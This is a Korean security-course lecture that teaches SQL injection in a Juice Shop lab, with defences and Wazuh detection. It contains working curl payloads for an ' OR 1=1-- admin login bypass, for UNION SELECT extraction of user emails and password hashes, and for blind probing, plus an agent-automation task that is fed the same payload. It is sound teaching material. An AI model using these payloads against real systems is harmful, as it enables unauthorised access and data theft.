# Week 04: OWASP Top 10 (1) - SQL Injection

## 학습 목표

- SQL의 기본 문법(SELECT, WHERE, UNION)을 이해한다
- SQL Injection의 원리와 유형을 파악한다
- JuiceShop에서 실제 SQL Injection 공격을 수행한다
- SQL Injection 방어 기법을 이해한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 |
| web | 10.20.30.80 | JuiceShop:3000 |

---

## 1. OWASP Top 10이란?

OWASP(Open Web Application Security Project)는 웹 애플리케이션 보안을 위한 국제 비영리 단체다. **OWASP Top 10**은 가장 치명적인 웹 보안 위협 10가지를 정리한 목록이다.

### OWASP Top 10 (2021)

| 순위 | 위협 | 이번 강의 |
|------|------|-----------|
| A01 | Broken Access Control | Week 06 |
| A02 | Cryptographic Failures | - |
| A03 | **Injection (SQL, XSS 등)** | **Week 04, 05** |
| A04 | Insecure Design | - |
| A05 | Security Misconfiguration | Week 07 |
| A06 | Vulnerable Components | - |
| A07 | Authentication Failures | Week 06 |
| A08 | Software and Data Integrity | - |
| A09 | Logging & Monitoring Failures | - |
| A10 | Server-Side Request Forgery | Week 07 |

---

## 2. SQL 기초

SQL(Structured Query Language)은 데이터베이스를 조작하는 언어다. SQL Injection을 이해하려면 SQL 기본 문법을 알아야 한다.

### 2.1 기본 문법

```sql
-- 테이블에서 모든 데이터 조회
SELECT * FROM Users;

-- 조건부 조회
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';

-- 여러 조건 (AND, OR)
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '1234';

-- 결과 합치기 (UNION)
SELECT id, email FROM Users
UNION
SELECT id, name FROM Products;

-- 주석 (뒷부분 무시)
SELECT * FROM Users WHERE email = 'admin' -- 이 뒤는 무시됨
SELECT * FROM Users WHERE email = 'admin' /* 블록 주석 */
```

### 2.2 로그인 쿼리의 동작

일반적인 웹 애플리케이션의 로그인 처리:

```
사용자 입력: email = "admin@juice-sh.op", password = "mypassword"

서버가 실행하는 SQL:
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = 'mypassword'
```

결과가 있으면 로그인 성공, 없으면 실패.

---

## 3. SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 **그대로** 삽입될 때 발생한다. 공격자가 입력에 SQL 구문을 넣어서 쿼리의 의미를 변경한다.

### 3.1 원리

**정상적인 경우:**
```
입력: email = "admin@juice-sh.op"
쿼리: SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '...'
```

**공격자의 입력:**
```
입력: email = "' OR 1=1--"
쿼리: SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```

쿼리를 분석해보자:
- `email = ''` → 빈 문자열과 비교 (거짓)
- `OR 1=1` → 항상 참
- `--` → SQL 주석, 뒤의 `AND password = '...'` 부분을 무시

결과: **모든 사용자가 반환됨** → 첫 번째 사용자(보통 admin)로 로그인 성공!

### 3.2 왜 위험한가?

SQL Injection으로 할 수 있는 것:
- **인증 우회**: 비밀번호 없이 로그인
- **데이터 탈취**: 전체 데이터베이스 내용 읽기
- **데이터 변조**: 데이터 수정/삭제
- **서버 장악**: 일부 DB에서는 OS 명령 실행 가능

---

## 4. SQL Injection 유형

### 4.1 Error-based SQLi

SQL 오류 메시지를 통해 정보를 추출한다.

```bash
# 오류를 유발하는 입력
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\''","password":"test"}' \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "error": {
        "message": "SQLITE_ERROR: unrecognized token: ...",
        "stack": "SequelizeDatabaseError: ..."
    }
}
```

> **분석**: 오류 메시지에서 **SQLite** 데이터베이스를 사용한다는 것과, **Sequelize** ORM을 사용한다는 것을 알 수 있다. 이 정보만으로도 공격에 큰 도움이 된다.

### 4.2 UNION-based SQLi

UNION SELECT를 사용하여 다른 테이블의 데이터를 추출한다.

```bash
# JuiceShop 검색 기능에 UNION 공격
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+1,2,3,4,5,6,7,8,9--" \
  | python3 -m json.tool
```

> UNION 공격이 성공하려면 원래 쿼리의 컬럼 수를 맞춰야 한다.

### 4.3 Blind SQLi

결과가 직접 보이지 않을 때, 참/거짓 응답의 차이로 정보를 추출한다.

```bash
# Boolean-based blind: 참일 때와 거짓일 때 응답이 다름
# 참인 조건
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=1--" | wc -c
# 거짓인 조건
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=2--" | wc -c
```

### 4.4 Time-based Blind SQLi

응답 시간의 차이로 정보를 추출한다.

```bash
# SQLite에서는 다른 방법 사용 (예시 개념)
# 참이면 응답이 느림, 거짓이면 빠름
time curl -s "http://10.20.30.80:3000/rest/products/search?q=test" > /dev/null
```

---

## 5. 실습: JuiceShop SQL Injection 공격

### 5.1 Challenge: Admin Login (관리자 로그인 우회)

JuiceShop의 가장 유명한 SQLi 챌린지다. 비밀번호 없이 admin 계정으로 로그인한다.

**Step 1: 정상 로그인 시도**

```bash
# 틀린 비밀번호로 로그인 시도
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}' \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "error": "Invalid email or password."
}
```

**Step 2: SQL Injection으로 로그인 우회**

```bash
# ' OR 1=1-- 를 이메일 필드에 삽입
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "authentication": {
        "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
        "bid": 1,
        "umail": "admin@juice-sh.op"
    }
}
```

> **성공!** 비밀번호 없이 admin 계정으로 로그인했다. `OR 1=1`이 모든 행을 반환하게 만들어서, 첫 번째 사용자(admin)로 로그인된 것이다.

**Step 3: 얻은 JWT 토큰 분석**

```bash
# 토큰 저장
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "Admin Token: $ADMIN_TOKEN"

# JWT 페이로드 디코딩
echo "$ADMIN_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
payload = sys.stdin.read().strip()
payload += '=' * (4 - len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload)
print(json.dumps(json.loads(decoded), indent=2, ensure_ascii=False))
"
```

**예상 출력:**
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin"
  },
  "iat": 1711526400
}
```

### 5.2 관리자 토큰으로 API 접근

```bash
# 관리자 전용 기능에 접근
# 전체 사용자 목록 조회
curl -s http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -m json.tool

# 관리자 패널 접근
curl -s http://10.20.30.80:3000/administration \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -o /dev/null -w "%{http_code}\n"
```

### 5.3 특정 사용자로 로그인

`' OR 1=1--`은 첫 번째 사용자로 로그인한다. 특정 사용자를 지정할 수도 있다:

```bash
# admin 이메일을 직접 지정하고 비밀번호 검증 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' \
  | python3 -m json.tool
```

**쿼리 분석:**
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'
```
- `admin@juice-sh.op'` → 이메일 지정
- `--` → 비밀번호 검증 부분을 주석 처리

### 5.4 검색 기능에서의 SQLi

```bash
# 정상 검색
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" \
  | python3 -m json.tool | head -15

# SQLi로 모든 제품 표시
curl -s "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--" \
  | python3 -m json.tool | head -30
```

---

## 6. SQL Injection 심화: 데이터 추출

### 6.1 테이블 구조 파악

SQLite에서 테이블 목록을 조회하는 방법:

```bash
# UNION SELECT로 테이블 목록 추출 시도
# 컬럼 수를 맞춰야 하므로 여러 번 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" \
  | python3 -m json.tool 2>/dev/null | head -30
```

> **참고**: JuiceShop의 검색 쿼리는 `SELECT * FROM Products WHERE ((name LIKE '%검색어%') OR (description LIKE '%검색어%'))` 형태이므로, 괄호를 닫아주어야 한다.

### 6.2 사용자 정보 추출

```bash
# 사용자 이메일과 비밀번호 해시 추출 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--" \
  | python3 -m json.tool 2>/dev/null | head -40
```

---

## 7. SQL Injection 방어

### 7.1 매개변수화된 쿼리 (Parameterized Queries)

**취약한 코드 (절대 하지 말 것):**
```javascript
// 사용자 입력이 SQL에 직접 삽입됨 - 위험!
const query = "SELECT * FROM Users WHERE email = '" + userInput + "'";
db.query(query);
```

**안전한 코드:**
```javascript
// 매개변수화된 쿼리 - 입력이 데이터로만 처리됨
const query = "SELECT * FROM Users WHERE email = ?";
db.query(query, [userInput]);
```

매개변수화된 쿼리에서는 `' OR 1=1--`을 입력해도 문자열 데이터로만 취급된다:
```sql
-- 실제 실행되는 쿼리
SELECT * FROM Users WHERE email = ''' OR 1=1--'
-- → email이 "' OR 1=1--"인 사용자를 찾음 (당연히 없음)
```

### 7.2 ORM 사용

ORM(Object-Relational Mapping)은 SQL을 직접 작성하지 않고 프로그래밍 언어의 객체로 DB를 조작한다.

```javascript
// Sequelize ORM 사용 (자동으로 매개변수화)
const user = await User.findOne({
  where: { email: userInput }
});
```

### 7.3 입력 검증 (Input Validation)

```javascript
// 이메일 형식 검증
if (!/^[a-zA-Z0-9@._-]+$/.test(userInput)) {
  throw new Error("Invalid email format");
}
```

### 7.4 최소 권한 원칙

데이터베이스 사용자에게 필요한 최소한의 권한만 부여한다:
- 웹 앱용 DB 계정: SELECT, INSERT만 허용
- 관리자용 DB 계정: 모든 권한
- DROP, ALTER 같은 위험한 권한은 웹 앱에 부여하지 않음

### 7.5 에러 메시지 제한

상세한 SQL 에러를 사용자에게 보여주지 않는다:
- **나쁜 예**: "SQLITE_ERROR: unrecognized token at 'OR 1=1'"
- **좋은 예**: "로그인에 실패했습니다."

---

## 8. JuiceShop에서 탐지: Wazuh 연동

SQL Injection 공격이 발생하면 SIEM에서 탐지할 수 있다.

```bash
# siem 서버에서 Wazuh 알림 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5 | python3 -m json.tool" 2>/dev/null
```

> **참고**: JuiceShop의 접근 로그에 SQLi 패턴이 기록되면, Wazuh 규칙이 이를 탐지하여 알림을 생성한다.

---

## 9. OpsClaw로 SQLi 테스트 자동화

```bash
# SQLi 테스트 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week04-sqli-test","request_text":"JuiceShop SQLi 취약점 점검","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "Project ID: $PROJECT_ID"

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# SQLi 테스트 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'\\'' OR 1=1--\\\",\\\"password\\\":\\\"test\\\"}\"",
        "risk_level": "medium"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
```

---

## 10. 실습 체크리스트

다음 항목을 모두 수행하라:

- [ ] JuiceShop 로그인 페이지에서 `' OR 1=1--`로 admin 로그인 성공
- [ ] 획득한 JWT 토큰을 디코딩하여 admin 정보 확인
- [ ] admin 토큰으로 `/api/Users/` API를 호출하여 전체 사용자 목록 조회
- [ ] 검색 기능에서 `' OR 1=1--`로 모든 제품 표시
- [ ] UNION SELECT를 사용하여 데이터 추출 시도
- [ ] 오류 메시지에서 데이터베이스 종류(SQLite) 확인

---

## 과제

1. JuiceShop의 로그인 API에 SQL Injection을 수행하여 admin으로 로그인하고, 획득한 JWT 토큰의 전체 내용을 디코딩하여 제출하라
2. 검색 API(`/rest/products/search`)에 UNION SELECT를 시도하여, Users 테이블의 이메일 목록을 추출하라 (힌트: 컬럼 수 9개)
3. "매개변수화된 쿼리"를 사용하면 SQL Injection이 왜 불가능해지는지 자신의 말로 설명하라
4. SQL Injection 공격이 SIEM(Wazuh)에서 어떻게 탐지될 수 있는지 논의하라

---

## 핵심 요약

- **SQL Injection**은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생하는 취약점이다
- `' OR 1=1--`는 가장 기본적인 SQLi 페이로드로, 인증 우회에 사용된다
- SQLi 유형: Error-based, UNION-based, Blind (Boolean/Time-based)
- **방어**: 매개변수화된 쿼리, ORM, 입력 검증, 최소 권한, 에러 메시지 제한
- JuiceShop에서 실제 SQLi 공격을 통해 admin 권한을 획득할 수 있다

> **다음 주 예고**: Week 05에서는 OWASP Top 10의 또 다른 Injection 공격인 XSS(Cross-Site Scripting)를 배운다. JavaScript를 이용한 쿠키 탈취와 세션 하이재킹을 실습한다.
